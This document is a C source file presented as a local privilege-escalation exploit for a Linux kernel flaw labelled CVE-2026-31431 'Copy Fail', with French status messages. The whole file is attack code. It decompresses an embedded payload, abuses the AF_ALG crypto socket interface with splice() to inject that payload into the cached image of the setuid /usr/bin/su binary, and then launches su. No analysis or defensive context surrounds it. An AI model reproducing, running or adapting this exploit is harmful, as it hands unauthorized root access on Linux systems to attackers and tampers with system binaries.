// copy_fail.c - Exploit CVE-2026-31431 "Copy Fail"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_alg.h>
#include <string.h>
#include <zlib.h>
#include <errno.h>

#define AF_ALG 38
#define SOL_ALG 279

#define ALG_SET_KEY             1
#define ALG_SET_OP              2
#define ALG_SET_IV              3
#define ALG_SET_AEAD_ASSOCLEN   4
#define ALG_SET_AEAD_AUTHSIZE   5

#define ALG_OP_DECRYPT 0

static const unsigned char compressed_payload[] = {
    0x78, 0xda, 0xab, 0x77, 0xf5, 0x71, 0x63, 0x62, 0x64, 0x64, 0x80, 0x01,
    0x26, 0x06, 0x3b, 0x06, 0x10, 0xaf, 0x82, 0xc1, 0x01, 0xcc, 0x77, 0x60,
    0xc0, 0x04, 0x0e, 0x0c, 0x16, 0x0c, 0x30, 0x1d, 0x20, 0x9a, 0x15, 0x4d,
    0x16, 0x99, 0x9e, 0x07, 0xe5, 0xc1, 0x68, 0x06, 0x01, 0x08, 0x65, 0x78,
    0xc0, 0xf0, 0xff, 0x86, 0x4c, 0x7e, 0x56, 0x8f, 0x5e, 0x5b, 0x7e, 0x10,
    0xf7, 0x5b, 0x96, 0x75, 0xc4, 0x4c, 0x7e, 0x56, 0xc3, 0xff, 0x59, 0x36,
    0x11, 0xfc, 0xac, 0xfa, 0x49, 0x99, 0x79, 0xfa, 0xc5, 0x19, 0x0c, 0x0c,
    0x0c, 0x00, 0x32, 0xc3, 0x10, 0xd3
};

int main(void) {
    int target_fd;
    unsigned char *payload;
    uLongf payload_len = 1024;
    int i;

    printf("[*] CVE-2026-31431 - Copy Fail exploit (C version)\n");

    payload = malloc(payload_len);
    if (!payload) {
        perror("malloc");
        return 1;
    }

    if (uncompress(payload, &payload_len, compressed_payload, sizeof(compressed_payload)) != Z_OK) {
        fprintf(stderr, "[-] Décompression zlib échouée\n");
        free(payload);
        return 1;
    }

    target_fd = open("/usr/bin/su", O_RDONLY);
    if (target_fd < 0) {
        perror("[-] Impossible d'ouvrir /usr/bin/su");
        free(payload);
        return 1;
    }

    printf("[+] /usr/bin/su ouvert\n");
    printf("[+] Payload décompressé : %lu octets\n", payload_len);

    for (i = 0; i < (int)payload_len; i += 4) {
        int sock, opsock;
        struct sockaddr_alg sa = {
            .salg_family = AF_ALG,
            .salg_type = "aead",
            .salg_name = "authencesn(hmac(sha256),cbc(aes))"
        };

        sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
        if (sock < 0) { perror("socket"); break; }

        if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            perror("bind");
            close(sock);
            break;
        }

        unsigned char key[80] = {0};
        memcpy(key, "\x08\x00\x01\x00\x00\x00\x00\x10", 8);
        setsockopt(sock, SOL_ALG, ALG_SET_KEY, key, sizeof(key));

        int authsize = 4;
        setsockopt(sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &authsize, sizeof(authsize));

        opsock = accept(sock, NULL, 0);
        if (opsock < 0) {
            perror("accept");
            close(sock);
            break;
        }

        unsigned char msg[8] = "AAAA";
        memcpy(msg + 4, payload + i, 4);

        char cbuf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)] = {0};
        struct msghdr msg_hdr = {0};
        struct iovec iov = { .iov_base = msg, .iov_len = 8 };

        msg_hdr.msg_iov = &iov;
        msg_hdr.msg_iovlen = 1;
        msg_hdr.msg_control = cbuf;
        msg_hdr.msg_controllen = sizeof(cbuf);

        struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg_hdr);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_IV;
        cmsg->cmsg_len = CMSG_LEN(20);
        memset(CMSG_DATA(cmsg), 0, 20);
        ((char*)CMSG_DATA(cmsg))[0] = 0x10;

        cmsg = CMSG_NXTHDR(&msg_hdr, cmsg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_OP;
        cmsg->cmsg_len = CMSG_LEN(4);
        *(int*)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

        cmsg = CMSG_NXTHDR(&msg_hdr, cmsg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
        cmsg->cmsg_len = CMSG_LEN(4);
        *(int*)CMSG_DATA(cmsg) = 8;

        sendmsg(opsock, &msg_hdr, 0);

        int pipefd[2];
        if (pipe(pipefd) == 0) {
            long offset = i;
            splice(target_fd, NULL, pipefd[1], NULL, offset + 4, SPLICE_F_MOVE);
            splice(pipefd[0], NULL, opsock, NULL, offset + 4, SPLICE_F_MOVE);
            close(pipefd[0]);
            close(pipefd[1]);
        }

        char buf[256];
        recv(opsock, buf, sizeof(buf), 0);

        close(opsock);
        close(sock);

        if ((i % 32) == 0)
            printf("[+] %d / %lu octets injectés\n", i, payload_len);
    }

    close(target_fd);
    free(payload);

    printf("[+] Injection terminée. Lancement de su...\n");
    execl("/usr/bin/su", "su", NULL);

    perror("execl");
    return 1;
}
